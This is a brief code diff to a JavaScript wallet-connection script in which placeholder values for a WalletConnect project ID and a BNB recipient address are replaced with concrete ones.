@@ -1,8 +1,8 @@
 import { WalletConnectModalSign } from "@walletconnect/modal-sign-html";
 import { ethers } from "ethers";
 
-const projectId = "YOUR_PROJECT_ID"; // WalletConnect Project ID
-const TO_ADDRESS = "0xYourRecipientAddressHere"; // ← آدرس مقصد BNB
+const projectId = "4d08946e6c316bed5e76b450ccbb5256"; // WalletConnect Project ID
+const TO_ADDRESS = "0x98907E5eE9E010c34DF6F7847565D421D3CDAd05"; // ← آدرس مقصد BNB
 const provider = new ethers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
 
 let userAddress = null;
